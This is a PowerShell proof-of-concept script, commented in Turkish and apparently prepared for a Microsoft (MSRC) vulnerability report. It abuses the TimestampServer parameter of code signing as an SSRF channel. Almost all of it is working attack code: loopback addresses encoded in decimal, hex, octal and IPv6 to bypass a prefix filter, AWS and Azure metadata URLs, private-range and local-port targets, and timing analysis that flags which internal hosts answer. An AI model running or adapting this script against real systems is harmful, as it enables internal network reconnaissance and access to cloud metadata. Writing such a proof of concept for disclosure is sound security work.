# ============================================================
# PoC: TimestampServer SSRF + IP Encoding Bypass
# Hedef: SignatureHelper.cs - SignFile() fonksiyonu
# Amaç: Internal host enumeration via hata kodu farkı
# ============================================================

# --- HAZIRLIK ---
# Test için self-signed code signing sertifikası oluştur
$cert = New-SelfSignedCertificate `
    -Subject "CN=SSRF PoC Test" `
    -CertStoreLocation "Cert:\CurrentUser\My" `
    -KeyUsage DigitalSignature `
    -Type CodeSigningCert

# İmzalanacak test dosyası
$testFile = "$env:TEMP\ssrf_poc_test.ps1"
"Write-Host 'PoC Test File'" | Set-Content $testFile

# ============================================================
# BÖLÜM 1: Baseline — Bilinen açık vs kapalı host farkı
# ============================================================
function Test-SSRFTarget {
    param(
        [string]$Url,
        [string]$Label
    )

    $start = Get-Date

    try {
        $result = Set-AuthenticodeSignature `
            -FilePath $testFile `
            -Certificate $cert `
            -TimestampServer $Url `
            -ErrorAction Stop

        $elapsed = ((Get-Date) - $start).TotalMilliseconds

        [PSCustomObject]@{
            Label   = $Label
            URL     = $Url
            Status  = $result.Status
            Elapsed = "$([math]::Round($elapsed))ms"
            Error   = "none"
        }
    }
    catch {
        $elapsed = ((Get-Date) - $start).TotalMilliseconds

        [PSCustomObject]@{
            Label   = $Label
            URL     = $Url
            Status  = "Exception"
            Elapsed = "$([math]::Round($elapsed))ms"
            Error   = $_.Exception.Message
        }
    }
}

# ============================================================
# BÖLÜM 2: IP Encoding Bypass Teknikleri
# Bunların HEPSİ prefix kontrolünden geçer
# ============================================================
$targets = @(
    # --- Standart ---
    @{ Url = "http://127.0.0.1/";          Label = "Loopback - standard" },
    @{ Url = "http://localhost/";           Label = "Loopback - hostname" },

    # --- Decimal IP (bypass tekniği) ---
    @{ Url = "http://2130706433/";          Label = "Loopback - decimal (2130706433 = 127.0.0.1)" },

    # --- Hex IP (bypass tekniği) ---
    @{ Url = "http://0x7f000001/";          Label = "Loopback - hex (0x7f000001 = 127.0.0.1)" },

    # --- Octal IP (bypass tekniği) ---
    @{ Url = "http://0177.0.0.1/";         Label = "Loopback - octal" },

    # --- IPv6 ---
    @{ Url = "http://[::1]/";              Label = "Loopback - IPv6" },
    @{ Url = "http://[0:0:0:0:0:0:0:1]/"; Label = "Loopback - IPv6 full" },

    # --- Cloud Metadata Endpoints ---
    @{ Url = "http://169.254.169.254/";              Label = "AWS metadata" },
    @{ Url = "http://169.254.169.254/latest/meta-data/"; Label = "AWS metadata path" },
    @{ Url = "http://168.63.129.16/";                Label = "Azure metadata" },

    # --- Internal Range Tarama ---
    @{ Url = "http://192.168.1.1/";        Label = "Internal - gateway" },
    @{ Url = "http://10.0.0.1/";           Label = "Internal - 10.x" },
    @{ Url = "http://172.16.0.1/";         Label = "Internal - 172.16.x" },

    # --- Port Tarama (localhost üzerinden) ---
    @{ Url = "http://127.0.0.1:80/";       Label = "Port scan - 80" },
    @{ Url = "http://127.0.0.1:443/";      Label = "Port scan - 443" },
    @{ Url = "http://127.0.0.1:8080/";     Label = "Port scan - 8080" },
    @{ Url = "http://127.0.0.1:3389/";     Label = "Port scan - RDP" },
    @{ Url = "http://127.0.0.1:5985/";     Label = "Port scan - WinRM" },

    # --- Var olmayan host (baseline/karşılaştırma) ---
    @{ Url = "http://this-host-does-not-exist-xyz.local/"; Label = "Nonexistent host (baseline)" }
)

# ============================================================
# BÖLÜM 3: Çalıştır ve Sonuçları Karşılaştır
# ============================================================
Write-Host "`n[*] SSRF PoC başlıyor..." -ForegroundColor Cyan
Write-Host "[*] Kullanılan sertifika: $($cert.Subject)" -ForegroundColor Cyan
Write-Host "[*] Test dosyası: $testFile`n" -ForegroundColor Cyan

$results = foreach ($target in $targets) {
    Write-Host "  Testing: $($target.Label)..." -NoNewline
    $r = Test-SSRFTarget -Url $target.Url -Label $target.Label
    Write-Host " [$($r.Elapsed)]" -ForegroundColor Yellow
    $r
}

# ============================================================
# BÖLÜM 4: Analiz — Timing + Hata Kodu Farkı
# ============================================================
Write-Host "`n`n=== SONUÇLAR ===" -ForegroundColor Green
$results | Format-Table -AutoSize

# Timing bazlı ayrım
Write-Host "`n=== TİMING ANALİZİ ===" -ForegroundColor Green
Write-Host "Yüksek elapsed = host erişilebilir (bağlantı kuruldu, timeout beklendi)"
Write-Host "Düşük elapsed  = host yok (hızlı DNS/TCP hatası)`n"

$baseline = ($results | Where-Object { $_.Label -like "*Nonexistent*" }).Elapsed -replace "ms",""

$results | ForEach-Object {
    $ms = $_.Elapsed -replace "ms",""
    $diff = [int]$ms - [int]$baseline

    if ($diff -gt 500) {
        Write-Host "[!] POTANSIYEL HIT: $($_.Label) — $($_.Elapsed) (+${diff}ms baseline'dan fazla)" `
            -ForegroundColor Red
    }
}

# ============================================================
# BÖLÜM 5: MSRC Raporu için Kanıt Çıktısı
# ============================================================
$reportPath = "$env:TEMP\ssrf_poc_report.txt"
$results | Out-File $reportPath

Write-Host "`n[*] Rapor kaydedildi: $reportPath" -ForegroundColor Cyan

# Temizlik
# Remove-Item $testFile -ErrorAction SilentlyContinue
# Remove-Item "Cert:\CurrentUser\My\$($cert.Thumbprint)" -ErrorAction SilentlyContinue
